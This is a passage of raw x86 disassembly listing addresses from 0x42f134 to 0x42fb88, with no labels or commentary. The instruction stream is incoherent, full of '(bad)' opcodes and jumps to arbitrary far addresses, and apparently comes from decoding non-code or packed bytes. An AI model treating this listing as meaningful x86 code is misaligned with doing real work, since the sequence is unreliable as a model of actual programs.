  42f134:	push   edi
  42f135:	add    dl,BYTE PTR [esi*4-0x58eaad69]
  42f13c:	bnd jp 0x42f16f
  42f13f:	dec    ecx
  42f140:	mov    esi,0xce75a8c2
  42f145:	mov    gs,WORD PTR [edx+0x5b]
  42f148:	ja     0x42f106
  42f14a:	add    al,0x5c
  42f14c:	jge    0x42f0ee
  42f14e:	(bad)  [edx]
  42f150:	loopne 0x42f11b
  42f152:	mov    eax,ds:0x83b4eb5a
  42f157:	sbb    eax,0xe4d7f4f8
  42f15c:	or     eax,0x48ed54ce
  42f161:	adc    al,0x39
  42f163:	cmp    DWORD PTR [edi+0x2a],edi
  42f166:	lods   eax,DWORD PTR ds:[esi]
  42f167:	ror    BYTE PTR ds:0xaa965925,1
  42f16d:	(bad)  
  42f16e:	es fadd st(7),st
  42f171:	retf   0x959a
  42f174:	fdiv   st(4),st
  42f176:	cmp    edx,DWORD PTR ds:0x4904a5bb
  42f17c:	dec    edi
  42f17d:	mov    ch,0x34
  42f17f:	(bad)  
  42f180:	stc    
  42f181:	sbb    BYTE PTR [ecx+0x529e3bfe],al
  42f187:	xor    BYTE PTR [ebx-0x20],0x59
  42f18b:	fdivp  st(2),st
  42f18d:	rcl    DWORD PTR [esi],0x56
  42f190:	aas    
  42f191:	popf   
  42f192:	test   DWORD PTR [edx],edx
  42f194:	jne    0x42f1db
  42f196:	jl     0x42f1f1
  42f198:	mov    ds:0x3d0c9139,al
  42f19d:	sub    BYTE PTR [esi],bl
  42f19f:	adc    al,0xae
  42f1a1:	add    DWORD PTR ds:0xd5aede9b,edx
  42f1a7:	ins    BYTE PTR es:[edi],dx
  42f1a8:	cs xchg ebp,eax
  42f1aa:	pop    ebp
  42f1ab:	mov    esi,DWORD PTR [ecx-0x63d23965]
  42f1b1:	int    0xb2
  42f1b3:	rcl    ebp,cl
  42f1b5:	std    
  42f1b6:	cs out dx,eax
  42f1b8:	shl    cl,1
  42f1ba:	inc    ecx
  42f1bb:	into   
  42f1bc:	sub    al,0x8d
  42f1be:	sub    dh,BYTE PTR [ecx]
  42f1c0:	popf   
  42f1c1:	add    DWORD PTR [eax],eax
	...
  42f233:	add    BYTE PTR [ebp-0x655875c3],ch
  42f239:	mov    bh,0xad
  42f23b:	aas    
  42f23c:	jp     0x42f245
  42f23e:	int3   
  42f23f:	icebp  
  42f240:	test   eax,edx
  42f242:	and    al,0x60
  42f244:	pushf  
  42f245:	repnz add DWORD PTR [eax],eax
  42f248:	test   BYTE PTR [eax],0x0
  42f24b:	add    BYTE PTR [edx],bh
  42f24d:	retf   
  42f24e:	and    DWORD PTR [edi-0x4a],0x12
  42f252:	outs   dx,DWORD PTR ds:[esi]
  42f253:	push   eax
  42f254:	or     ah,ch
  42f256:	scas   eax,DWORD PTR es:[edi]
  42f257:	jmp    eax
  42f259:	imul   BYTE PTR [esi]
  42f25b:	adc    dh,BYTE PTR [ebp-0x3b]
  42f25e:	pop    ebp
  42f25f:	pop    ecx
  42f260:	add    dl,BYTE PTR [eax]
  42f262:	and    BYTE PTR [eax+0x4009bc85],0x54
  42f269:	mov    edi,0x6e612ca3
  42f26e:	jp     0x42f238
  42f270:	outs   dx,BYTE PTR ds:[esi]
  42f271:	cwde   
  42f272:	bound  eax,QWORD PTR [ecx]
  42f274:	mov    al,0x74
  42f276:	push   esp
  42f277:	cmp    BYTE PTR [eax+edx*8+0x10],dh
  42f27b:	or     DWORD PTR [ebx-0x7f10553d],esp
  42f281:	(bad)  [edx-0x3a1396be]
  42f287:	sub    ch,bl
  42f289:	(bad)  
  42f28a:	ds repnz mov esp,0xdb82b6e5
  42f291:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f292:	mov    bh,0xb3
  42f294:	add    BYTE PTR [eax],bh
  42f296:	sbb    al,ah
  42f298:	ss scas al,BYTE PTR es:[edi]
  42f29a:	mov    al,ds:0x8a8e7dca
  42f29f:	and    ebx,ebp
  42f2a1:	outs   dx,DWORD PTR ds:[esi]
  42f2a2:	jae    0x42f2bf
  42f2a4:	dec    edi
  42f2a5:	cmp    eax,0xfe53a2ef
  42f2aa:	sbb    al,BYTE PTR [ecx+ecx*2]
  42f2ad:	pusha  
  42f2ae:	mov    ch,al
  42f2b0:	scas   al,BYTE PTR es:[edi]
  42f2b1:	repnz mov dh,0xd
  42f2b4:	push   es
  42f2b5:	ret    0x3178
  42f2b8:	hlt    
  42f2b9:	retf   
  42f2ba:	loop   0x42f251
  42f2bc:	popa   
  42f2bd:	hlt    
  42f2be:	loope  0x42f2ac
  42f2c0:	xlat   BYTE PTR ds:[ebx]
  42f2c1:	aaa    
  42f2c2:	mov    esi,0xc51f35dc
  42f2c7:	leave  
  42f2c8:	mov    bl,0x68
  42f2ca:	leave  
  42f2cb:	add    eax,0x97d33048
  42f2d0:	inc    esi
  42f2d1:	fsub   DWORD PTR [ebp+0x46]
  42f2d4:	pop    es
  42f2d5:	xor    DWORD PTR [edx+0x7f],0x16e9e5c
  42f2dc:	pop    edi
  42f2dd:	pushf  
  42f2de:	je     0x42f2b1
  42f2e0:	dec    edx
  42f2e1:	mov    BYTE PTR ds:0xae50bea5,cl
  42f2e7:	dec    esp
  42f2e8:	push   eax
  42f2e9:	mov    al,ds:0x8d0484fe
  42f2ee:	dec    eax
  42f2ef:	pop    ebp
  42f2f0:	jnp    0x42f2e7
  42f2f2:	out    dx,al
  42f2f3:	push   edi
  42f2f4:	pop    edx
  42f2f5:	add    cl,ah
  42f2f7:	aas    
  42f2f8:	loope  0x42f300
  42f2fa:	hlt    
  42f2fb:	push   ss
  42f2fc:	fwait
  42f2fd:	push   eax
  42f2fe:	add    eax,0x8c24398c
  42f303:	jns    0x42f298
  42f305:	loopne 0x42f321
  42f307:	iret   
  42f308:	enter  0x6cbd,0x30
  42f30c:	jp     0x42f2a4
  42f30e:	cmp    ch,al
  42f310:	lods   al,BYTE PTR ds:[esi]
  42f311:	or     ah,BYTE PTR [ebx+0xf]
  42f314:	sbb    eax,DWORD PTR [esi+esi*1]
  42f317:	jne    0x42f2e7
  42f319:	or     eax,0xadd20496
  42f31e:	addr16 jmp 0x42f31f
  42f321:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f322:	dec    ebx
  42f323:	jnp    0x42f31d
  42f325:	mov    bh,0x79
  42f327:	ss icebp 
  42f329:	jmp    0xab21880c
  42f32e:	pop    eax
  42f32f:	mov    eax,0x321a756c
  42f334:	popa   
  42f335:	jbe    0x42f2c4
  42f337:	bound  ebp,QWORD PTR [ebx]
  42f339:	inc    eax
  42f33a:	inc    ebx
  42f33b:	lds    eax,FWORD PTR [edi-0x20b1285]
  42f341:	test   eax,0x0
	...
  42f3b2:	add    BYTE PTR [eax],al
  42f3b4:	loop   0x42f373
  42f3b6:	fadd   st(7),st
  42f3b8:	(bad)  
  42f3ba:	sti    
  42f3bb:	mov    ebp,0xca33a8a7
  42f3c0:	ret    0x716d
  42f3c3:	xchg   ebp,eax
  42f3c4:	xchg   edx,eax
  42f3c5:	repz add DWORD PTR [eax],eax
  42f3c8:	test   BYTE PTR [eax],0x0
  42f3cb:	add    BYTE PTR [eax-0x27],dh
  42f3ce:	(bad)  
  42f3cf:	cmp    al,0xb4
  42f3d1:	jno    0x42f3ef
  42f3d3:	push   ebp
  42f3d4:	aas    
  42f3d5:	push   esi
  42f3d6:	xor    BYTE PTR [ebx+0x7f6e1e52],ah
  42f3dc:	imul   ebp,DWORD PTR [esi],0x3d
  42f3df:	jmp    0xf196f98f
  42f3e4:	loope  0x42f411
  42f3e6:	aad    0x67
  42f3e8:	or     eax,0x419c73d6
  42f3ed:	jecxz  0x42f45e
  42f3ef:	sbb    bl,BYTE PTR [ebp-0x44]
  42f3f2:	jle    0x42f450
  42f3f4:	test   al,0xf1
  42f3f6:	(bad)  
  42f3f7:	fwait
  42f3f8:	mov    dh,0x11
  42f3fa:	loopne 0x42f476
  42f3fc:	lods   al,BYTE PTR ds:[esi]
  42f3fd:	pop    eax
  42f3fe:	xor    dl,dh
  42f400:	repnz dec ecx
  42f402:	pop    edx
  42f403:	test   al,0x96
  42f405:	inc    ebp
  42f406:	sbb    BYTE PTR [edi+0x4a],bh
  42f409:	hlt    
  42f40a:	sub    ebp,DWORD PTR ds:0x250b6537
  42f410:	fld    QWORD PTR [eax-0x36]
  42f413:	sbb    eax,0x74126c04
  42f418:	jecxz  0x42f42d
  42f41a:	mov    eax,ds:0x9688e2e5
  42f41f:	out    0xa7,al
  42f421:	call   0xe0f0:0xedac044a
  42f428:	pop    ebx
  42f429:	js     0x42f3b8
  42f42b:	bound  edi,QWORD PTR [ecx-0x40]
  42f42e:	mov    esp,esi
  42f430:	loope  0x42f3ea
  42f432:	cmp    ebx,DWORD PTR [edx+0x38]
  42f435:	jle    0x42f43f
  42f437:	mov    ds:0xe97fd750,al
  42f43c:	sub    esi,DWORD PTR [esp+ebx*1]
  42f43f:	xchg   bl,ch
  42f441:	les    esp,FWORD PTR [ebx+eax*2-0x1a8a3935]
  42f448:	dec    esp
  42f449:	stos   DWORD PTR es:[edi],eax
  42f44a:	lods   al,BYTE PTR ds:[esi]
  42f44b:	(bad)  
  42f44d:	lods   eax,DWORD PTR ds:[esi]
  42f44e:	repnz push edx
  42f450:	lock dec esp
  42f452:	cmp    eax,0x7da2c810
  42f457:	imul   ebx,DWORD PTR [edx+0x13],0x6f849c8
  42f45e:	push   es
  42f45f:	mov    ds:0xc3d32cfe,al
  42f464:	add    eax,0xdd232b18
  42f469:	fdiv   QWORD PTR [edx-0x63a3eb3a]
  42f46f:	fcom   QWORD PTR [esi+0x38026cba]
  42f475:	lds    esp,FWORD PTR cs:[esi+0x5]
  42f479:	(bad)  
  42f47a:	and    al,0x6a
  42f47c:	mov    ds:0x9fd42e46,al
  42f481:	jbe    0x42f4a5
  42f483:	cmpxchg DWORD PTR [edi],edi
  42f486:	fcomp  DWORD PTR [esi+eax*8+0x5477397]
  42f48d:	mov    ch,0x78
  42f48f:	ret    
  42f490:	ficomp WORD PTR [esi+0x7e30ab5c]
  42f496:	addr16 jge 0x42f456
  42f499:	xor    BYTE PTR [esp+edi*2],0x56
  42f49d:	das    
  42f49e:	adc    DWORD PTR [ebp+0x7a3a5bc4],ebp
  42f4a4:	sbb    BYTE PTR [eax+0x1b],dh
  42f4a7:	ins    DWORD PTR es:[edi],dx
  42f4a8:	out    0x76,eax
  42f4aa:	icebp  
  42f4ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f4ac:	lahf   
  42f4ad:	xchg   ecx,eax
  42f4ae:	mov    bl,0xe6
  42f4b0:	aas    
  42f4b1:	call   0xd70a:0x6be24ab8
  42f4b8:	out    0x9c,al
  42f4ba:	mov    ds:0x26b86a6a,eax
  42f4bf:	dec    edx
  42f4c0:	jo     0x42f4dc
	...
  42f532:	add    BYTE PTR [eax],al
  42f534:	push   ebp
  42f535:	cmp    dh,cl
  42f537:	adc    bh,ch
  42f539:	neg    bh
  42f53b:	jge    0x42f546
  42f53d:	push   cs
  42f53e:	xchg   BYTE PTR [edi-0x13],bh
  42f541:	imul   edi,DWORD PTR [ecx+0x1f48804],0xf600
  42f54b:	add    BYTE PTR [esi+0x25],cl
  42f54e:	data16 rcl BYTE PTR [ecx],0x11
  42f552:	xchg   esi,eax
  42f553:	push   eax
  42f554:	xor    eax,0xfdce3e46
  42f559:	test   eax,0xb96f33e2
  42f55e:	fisub  WORD PTR [ebp-0x14]
  42f561:	in     eax,dx
  42f562:	jns    0x42f5b1
  42f564:	jo     0x42f505
  42f566:	mov    esp,0x9be985f2
  42f56b:	inc    ebp
  42f56c:	in     al,dx
  42f56d:	and    dh,cl
  42f56f:	outs   dx,DWORD PTR ds:[esi]
  42f570:	sub    al,0xa
  42f572:	iret   
  42f573:	xor    eax,0xa386b0ce
  42f578:	add    esi,DWORD PTR [eax-0x18451adb]
  42f57e:	sub    BYTE PTR [esi+0x61],bl
  42f581:	push   0x79
  42f583:	lock cli 
  42f585:	push   ebx
  42f586:	inc    edi
  42f587:	dec    edi
  42f588:	(bad)  
  42f589:	sub    al,0xb
  42f58b:	jbe    0x42f5c4
  42f58d:	mov    dh,0x11
  42f58f:	mov    cl,0xe4
  42f591:	js     0x42f5ca
  42f593:	pop    esp
  42f594:	jg     0x42f5f4
  42f596:	aas    
  42f597:	inc    ecx
  42f598:	jmp    0xc1ed:0xab372863
  42f59f:	stc    
  42f5a0:	push   cs
  42f5a1:	mov    ecx,0x8742b32c
  42f5a6:	stc    
  42f5a7:	lea    ebx,[esi+0x5668ad9b]
  42f5ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f5ae:	adc    BYTE PTR [ebx+0x6],al
  42f5b1:	shl    DWORD PTR [ecx+0x4c],0xfd
  42f5b5:	dec    edi
  42f5b6:	popf   
  42f5b7:	jns    0x42f591
  42f5b9:	or     edx,DWORD PTR [ecx-0x6c9ebe37]
  42f5bf:	and    DWORD PTR [esi-0x33],0xfffffffe
  42f5c3:	daa    
  42f5c4:	mul    BYTE PTR [edi-0x3db08c1a]
  42f5ca:	aam    0x52
  42f5cc:	clc    
  42f5cd:	outs   dx,DWORD PTR ds:[esi]
  42f5ce:	repz push ebx
  42f5d0:	dec    edi
  42f5d1:	dec    esp
  42f5d2:	or     dh,0x99
  42f5d5:	imul   edx,DWORD PTR [eax],0x3717b5df
  42f5db:	mov    BYTE PTR [ecx+esi*8+0x51],0xf6
  42f5e0:	addr16 ret 
  42f5e2:	lock inc ecx
  42f5e4:	aad    0x8
  42f5e6:	sub    eax,0x1cf675f7
  42f5eb:	xlat   BYTE PTR ds:[ebx]
  42f5ec:	jae    0x42f5f4
  42f5ee:	arpl   WORD PTR [esi+edi*4],di
  42f5f1:	in     al,0xcb
  42f5f3:	or     bh,BYTE PTR [ecx-0x25]
  42f5f6:	inc    esi
  42f5f7:	je     0x42f624
  42f5f9:	and    DWORD PTR [eax-0x1606ecac],0x42fe8b61
  42f603:	lods   eax,DWORD PTR ds:[esi]
  42f604:	jbe    0x42f659
  42f606:	popf   
  42f607:	adc    ch,BYTE PTR [ecx]
  42f609:	jecxz  0x42f611
  42f60b:	cwde   
  42f60c:	mov    ds,WORD PTR [ebx+esi*1-0x1a]
  42f610:	dec    edx
  42f611:	sti    
  42f612:	mov    dl,0xaf
  42f614:	adc    ah,BYTE PTR [edi]
  42f616:	clc    
  42f617:	push   ds
  42f618:	or     BYTE PTR [esi-0x4f9dfed1],bh
  42f61e:	or     BYTE PTR [edx],dh
  42f620:	into   
  42f621:	inc    ebx
  42f622:	into   
  42f623:	fidivr WORD PTR gs:[eax+0x7b2ae200]
  42f62a:	sub    edi,ebp
  42f62c:	or     eax,0x3b06bf16
  42f631:	ins    BYTE PTR es:[edi],dx
  42f632:	ins    DWORD PTR es:[edi],dx
  42f633:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f634:	arpl   WORD PTR ds:0x1d7ae519,cx
  42f63a:	sahf   
  42f63b:	je     0x42f675
  42f63d:	xor    dh,cl
  42f63f:	and    ecx,eax
  42f641:	cmc    
	...
  42f6b2:	add    BYTE PTR [eax],al
  42f6b4:	pop    edx
  42f6b5:	cmp    DWORD PTR [esi+0x2d],ecx
  42f6b8:	outs   dx,DWORD PTR ds:[esi]
  42f6b9:	jg     0x42f736
  42f6bb:	jg     0x42f6c6
  42f6bd:	mov    bh,0xe3
  42f6bf:	xor    dh,bl
  42f6c1:	fyl2xp1 
  42f6c3:	dec    ecx
  42f6c4:	jle    0x42f6bb
  42f6c6:	add    DWORD PTR [eax],eax
  42f6c8:	test   BYTE PTR [eax],0x0
  42f6cb:	add    BYTE PTR [ecx-0x4dc898df],al
  42f6d1:	(bad)  
  42f6d2:	dec    ebp
  42f6d3:	push   0x3b
  42f6d5:	ja     0x42f663
  42f6d7:	test   BYTE PTR [edx-0x256bf9d9],dh
  42f6dd:	or     eax,0xc22feca1
  42f6e2:	mov    bh,0x2d
  42f6e4:	fild   DWORD PTR [edx+0x55]
  42f6e7:	sub    eax,0xaec47b5e
  42f6ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f6ed:	das    
  42f6ee:	(bad)  
  42f6ef:	fstp   TBYTE PTR [esi+0x15]
  42f6f2:	mov    al,0xd4
  42f6f4:	fchs   
  42f6f6:	push   ss
  42f6f7:	(bad)  
  42f6f8:	fdiv   QWORD PTR [edx]
  42f6fa:	outs   dx,BYTE PTR ds:[esi]
  42f6fb:	clc    
  42f6fc:	(bad)  
  42f6fd:	pop    ecx
  42f6fe:	mov    esp,0xfd554f33
  42f703:	in     al,dx
  42f704:	add    DWORD PTR [edx+0x5],0x7f03a1f1
  42f70b:	std    
  42f70c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f70d:	adc    ah,BYTE PTR ss:[edi+0x67]
  42f711:	jg     0x42f77e
  42f713:	dec    ebx
  42f714:	cdq    
  42f715:	stc    
  42f716:	sbb    eax,0x478a58a4
  42f71b:	adc    al,0xce
  42f71d:	push   es
  42f71e:	jge    0x42f6c4
  42f720:	or     edx,DWORD PTR [eax]
  42f722:	leave  
  42f723:	xor    DWORD PTR [ebp+0x0],eax
  42f726:	sbb    BYTE PTR [edi+0x6d],cl
  42f729:	mov    ebx,DWORD PTR [ebx-0x47b7c0c5]
  42f72f:	pcmpeqd mm5,QWORD PTR ds:0xfbf10e8a
  42f736:	jb     0x42f782
  42f738:	jge    0x42f6c4
  42f73a:	and    DWORD PTR [ecx],esi
  42f73c:	cmp    eax,0xbec652a6
  42f741:	idiv   DWORD PTR [ebp-0x6c9826ec]
  42f747:	std    
  42f748:	pop    es
  42f749:	adc    ebx,esi
  42f74b:	adc    eax,0xbcecb407
  42f750:	in     al,0xa7
  42f752:	mov    ds:0xa1c18299,eax
  42f757:	inc    esp
  42f758:	cmp    al,0x85
  42f75a:	shr    edx,0xb1
  42f75d:	mov    dl,BYTE PTR [edi+0x40ebb201]
  42f763:	push   cs
  42f764:	push   0xffffffaa
  42f766:	imul   esi,DWORD PTR [ebx+0x1786099f],0xfffffff3
  42f76d:	shr    DWORD PTR [edx+ebx*4],1
  42f770:	shr    BYTE PTR [edx],cl
  42f772:	jns    0x42f7cd
  42f774:	adc    eax,esi
  42f776:	in     eax,0x16
  42f778:	jno    0x61dde0c
  42f77e:	scas   al,BYTE PTR es:[edi]
  42f77f:	rol    DWORD PTR [esp+eax*2+0x4c],1
  42f783:	leave  
  42f784:	xor    BYTE PTR [eax-0x5e659e5e],bh
  42f78a:	outs   dx,DWORD PTR ds:[esi]
  42f78b:	arpl   WORD PTR [esi+0x4c1d7770],dx
  42f791:	cld    
  42f792:	mov    ch,0x48
  42f794:	mov    esi,DWORD PTR [ebx]
  42f796:	fs sub edx,esi
  42f799:	jmp    0x3fc01843
  42f79e:	int3   
  42f79f:	xor    al,0x81
  42f7a1:	mov    dh,0x96
  42f7a3:	mov    al,es:0x82703846
  42f7a9:	mov    ch,BYTE PTR [edx-0x4]
  42f7ac:	sbb    eax,0xdacf02c7
  42f7b1:	adc    DWORD PTR [esp+ebx*2+0x3b9557bd],edx
  42f7b8:	jo     0x42f7ad
  42f7ba:	pusha  
  42f7bb:	mov    ecx,0xbe5d1124
  42f7c0:	fwait
  42f7c1:	and    BYTE PTR [eax],al
	...
  42f833:	add    bl,al
  42f835:	ja     0x42f897
  42f837:	and    al,0xf4
  42f839:	aaa    
  42f83a:	(bad)  
  42f83b:	neg    DWORD PTR [edi-0xeaf3771]
  42f841:	lock lea ecx,[ebx+0x74]
  42f845:	test   BYTE PTR [ecx],0x0
  42f848:	test   BYTE PTR [eax],0x0
  42f84b:	add    BYTE PTR ds:0xdbacecd9,ch
  42f851:	(bad)  
  42f852:	sahf   
  42f853:	and    BYTE PTR [ecx],bl
  42f855:	lahf   
  42f856:	arpl   WORD PTR [eax+0x5f],cx
  42f859:	pushw  0xffd4
  42f85c:	scas   eax,DWORD PTR es:[edi]
  42f85d:	sbb    BYTE PTR [edi+0x6ad0dcde],0x6d
  42f864:	jl     0x42f8af
  42f866:	jg     0x42f7eb
  42f868:	fnsave [eax]
  42f86a:	pop    ds
  42f86b:	imul   ebp,DWORD PTR cs:[esi+esi*4-0xd],0xffffffd5
  42f871:	xchg   ebp,eax
  42f872:	add    eax,0xe8989b26
  42f877:	push   ds
  42f878:	ret    
  42f879:	stos   DWORD PTR es:[edi],eax
  42f87a:	xchg   esi,eax
  42f87b:	push   eax
  42f87c:	nop
  42f87d:	mov    ebp,0x3e4255f2
  42f882:	imul   esp,DWORD PTR [bx-0x7],0xffffffc0
  42f887:	icebp  
  42f888:	dec    edi
  42f889:	ins    DWORD PTR es:[edi],dx
  42f88a:	cmp    eax,DWORD PTR [ecx+eax*4]
  42f88d:	sub    eax,0x25f23009
  42f892:	push   0x23
  42f894:	push   edx
  42f895:	mov    eax,ds:0x21007e51
  42f89a:	jb     0x42f833
  42f89c:	sub    ah,BYTE PTR [edx+0x68]
  42f89f:	ins    DWORD PTR es:[edi],dx
  42f8a0:	daa    
  42f8a1:	push   ds
  42f8a2:	fs data16 jae 0x42f924
  42f8a6:	or     al,0x62
  42f8a8:	cmp    DWORD PTR gs:[eax],ebp
  42f8ab:	lock cmp dh,BYTE PTR [esi]
  42f8ae:	push   ds
  42f8af:	mov    BYTE PTR [ebx-0xff26cab],ah
  42f8b5:	lock pop ebp
  42f8b7:	pop    ebx
  42f8b8:	dec    esi
  42f8b9:	dec    edi
  42f8ba:	mov    dl,BYTE PTR [esi]
  42f8bc:	jmp    0xe6abd142
  42f8c1:	sbb    DWORD PTR [eax+0x21],esp
  42f8c4:	mov    WORD PTR [edx-0xbdb7bf8],ds
  42f8ca:	rol    DWORD PTR [ebx+0x4f],0x77
  42f8ce:	and    edx,0x53
  42f8d1:	adc    al,bh
  42f8d3:	ins    DWORD PTR es:[edi],dx
  42f8d4:	sahf   
  42f8d5:	pop    ebx
  42f8d6:	cmp    eax,0x50a16ea3
  42f8db:	(bad)  
  42f8dc:	ffree  st(6)
  42f8de:	(bad)  
  42f8df:	cmp    al,0x95
  42f8e1:	icebp  
  42f8e2:	adc    cl,BYTE PTR [eax-0x6b]
  42f8e5:	cwde   
  42f8e6:	ins    BYTE PTR es:[edi],dx
  42f8e7:	clc    
  42f8e8:	pusha  
  42f8e9:	pushf  
  42f8ea:	jno    0x42f949
  42f8ec:	loop   0x42f91b
  42f8ee:	push   ecx
  42f8ef:	push   ss
  42f8f0:	mov    bh,0xb
  42f8f2:	cmp    eax,0x85317f2
  42f8f7:	pop    ss
  42f8f8:	jne    0x42f92c
  42f8fa:	out    0x1f,al
  42f8fc:	lods   eax,DWORD PTR ds:[esi]
  42f8fd:	(bad)  
  42f8fe:	fisttp DWORD PTR [ebx-0x720949bb]
  42f904:	mov    dh,0x72
  42f906:	jnp    0x42f986
  42f908:	es loopne 0x42f8be
  42f90b:	das    
  42f90c:	sbb    eax,0xdfd215e6
  42f911:	inc    ebp
  42f912:	icebp  
  42f913:	dec    eax
  42f914:	xchg   esp,eax
  42f915:	sete   BYTE PTR [esi-0x6eba33cf]
  42f91c:	ja     0x42f8b6
  42f91e:	adc    eax,0xbcdba844
  42f923:	inc    ebx
  42f924:	push   ds
  42f925:	adc    ecx,DWORD PTR [ebp+0x53]
  42f928:	fistp  DWORD PTR [ecx+0x2]
  42f92b:	dec    ebx
  42f92c:	cmp    DWORD PTR [eax+0x4cdc4a2e],eax
  42f932:	hlt    
  42f933:	pusha  
  42f934:	push   ds
  42f935:	loop   0x42f8d8
  42f937:	dec    edi
  42f938:	adc    edx,DWORD PTR [edi-0x65]
  42f93b:	or     ch,BYTE PTR [edi+0x1f]
  42f93e:	cs jl  0x42f982
  42f941:	xchg   BYTE PTR [eax],al
	...
  42f9b3:	add    ch,ah
  42f9b5:	mov    edx,0xebdfe392
  42f9ba:	cmc    
  42f9bb:	mov    esi,0x4d34a307
  42f9c0:	call   0x1f7:0x6a7131f2
  42f9c7:	add    dh,dh
  42f9c9:	add    BYTE PTR [eax],al
  42f9cb:	add    BYTE PTR [ebx+0x64],al
  42f9ce:	pop    es
  42f9cf:	repz jmp 0x231b:0xfc46258
  42f9d7:	je     0x42fa4c
  42f9d9:	add    DWORD PTR [edx],ebp
  42f9db:	inc    ebx
  42f9dc:	lahf   
  42f9dd:	pop    eax
  42f9de:	add    eax,DWORD PTR [ebp-0x774a86bd]
  42f9e4:	imul   edx,DWORD PTR [esi-0x25],0x8b6264bc
  42f9eb:	xchg   esp,eax
  42f9ec:	dec    esi
  42f9ed:	iret   
  42f9ee:	fnstcw WORD PTR [ebx+0x49a0b3a5]
  42f9f4:	jne    0x42f9b1
  42f9f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f9f7:	lock in eax,0x62
  42f9fa:	stc    
  42f9fb:	dec    esi
  42f9fc:	ins    BYTE PTR es:[edi],dx
  42f9fd:	push   eax
  42f9fe:	shr    dl,0xcc
  42fa01:	push   eax
  42fa02:	and    ebp,edi
  42fa04:	loop   0x42fa0e
  42fa06:	cmc    
  42fa07:	js     0x42fa55
  42fa09:	scas   al,BYTE PTR es:[edi]
  42fa0a:	mov    al,0x4a
  42fa0c:	(bad)  
  42fa0e:	dec    edi
  42fa0f:	pop    esp
  42fa10:	adc    DWORD PTR [edi-0x5a],0xffffff80
  42fa14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fa15:	mov    ebx,0xaf4b594
  42fa1a:	push   edx
  42fa1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fa1c:	mov    bl,0x31
  42fa1e:	pop    ss
  42fa1f:	sbb    eax,0x89c6d1dd
  42fa24:	mov    ah,0x4d
  42fa26:	lahf   
  42fa27:	xor    DWORD PTR [edx],ebx
  42fa29:	mov    ebx,0x8955239c
  42fa2e:	ins    BYTE PTR es:[edi],dx
  42fa2f:	fmul   st(4),st
  42fa31:	pop    esp
  42fa32:	inc    eax
  42fa33:	ds pop ebp
  42fa35:	ins    BYTE PTR es:[edi],dx
  42fa36:	sub    BYTE PTR [esi],dh
  42fa38:	mov    dh,0x9c
  42fa3a:	xchg   ebx,eax
  42fa3b:	enter  0x9de4,0xd
  42fa3f:	adc    BYTE PTR [ebx+0xf9779a6],cl
  42fa45:	mov    esi,0x5100ad66
  42fa4a:	and    bl,bl
  42fa4c:	or     DWORD PTR [edi-0x87f8bb3],ecx
  42fa52:	push   esi
  42fa53:	loopne 0x42f9f1
  42fa55:	stos   DWORD PTR es:[edi],eax
  42fa56:	nop
  42fa57:	add    eax,DWORD PTR [ebx]
  42fa59:	sub    eax,0xa31128ba
  42fa5e:	pop    esp
  42fa5f:	sbb    eax,0x380545a2
  42fa64:	push   es
  42fa65:	call   0xaa35703
  42fa6a:	mul    DWORD PTR [edx]
  42fa6c:	and    dh,BYTE PTR [edi+0x4b9ce5da]
  42fa72:	inc    ebp
  42fa73:	sbb    eax,0xb67947be
  42fa78:	sub    al,0xb6
  42fa7a:	push   edx
  42fa7b:	(bad)  
  42fa7c:	fsubr  QWORD PTR [eax-0x875fbcd]
  42fa82:	test   al,0x4
  42fa84:	in     al,dx
  42fa85:	push   esp
  42fa86:	jae    0x42fa1e
  42fa88:	or     eax,DWORD PTR [ebx-0x34]
  42fa8b:	adc    esi,DWORD PTR [esi+0x68bfa594]
  42fa91:	mov    edi,0x582b1b0e
  42fa96:	ret    0x9daa
  42fa99:	sbb    eax,0xfcac6751
  42fa9e:	fcmovnbe st,st(1)
  42faa0:	mov    ds:0x1feebc21,al
  42faa5:	xchg   esp,eax
  42faa6:	jmp    0xc3d92ac9
  42faab:	inc    esi
  42faac:	sub    al,BYTE PTR [ecx]
  42faae:	push   ds
  42faaf:	in     eax,dx
  42fab0:	pop    edx
  42fab1:	retf   0xd181
  42fab4:	ja     0x42fad0
  42fab6:	out    0x84,eax
  42fab8:	add    eax,0x9555af22
  42fabd:	jp     0x42fa81
  42fabf:	aad    0x98
  42fac1:	add    BYTE PTR ds:[eax],al
	...
  42fb34:	jle    0x42fb77
  42fb36:	jne    0xfc41ca7b
  42fb3c:	cmp    DWORD PTR [ebx+0x4a],ebp
  42fb3f:	pop    es
  42fb40:	aas    
  42fb41:	ret    0x63ec
  42fb44:	pusha  
  42fb45:	clc    
  42fb46:	add    DWORD PTR [eax],eax
  42fb48:	test   BYTE PTR [eax],0x0
  42fb4b:	add    dh,bl
  42fb4d:	xchg   edx,eax
  42fb4e:	adc    BYTE PTR [ecx],bh
  42fb50:	fidiv  DWORD PTR [ecx+0x77]
  42fb53:	je     0x42fbbe
  42fb55:	fisubr WORD PTR [ebx-0x2e]
  42fb58:	shl    BYTE PTR [ecx],1
  42fb5a:	and    DWORD PTR [ebx],ebp
  42fb5c:	jp     0x42fb14
  42fb5e:	pusha  
  42fb5f:	stos   BYTE PTR es:[edi],al
  42fb60:	jno    0x42fb81
  42fb62:	pop    ds
  42fb63:	test   DWORD PTR [edx],ecx
  42fb65:	ins    BYTE PTR es:[edi],dx
  42fb66:	sbb    bl,BYTE PTR [ebx]
  42fb68:	cmp    BYTE PTR [ebx+0x3],al
  42fb6b:	stos   BYTE PTR es:[edi],al
  42fb6c:	pop    ebx
  42fb6d:	inc    ebp
  42fb6e:	sub    eax,0xb7fdff39
  42fb73:	inc    eax
  42fb74:	aaa    
  42fb75:	jmp    0x3fc92213
  42fb7a:	sub    bh,BYTE PTR [esi+0x31]
  42fb7d:	add    eax,0x759dc8a3
  42fb82:	xchg   ebx,eax
  42fb83:	dec    edx
  42fb84:	dec    esp
  42fb85:	jo     0x42fbe7
  42fb87:	dec    eax
  42fb88:	jp     0x42fbc0
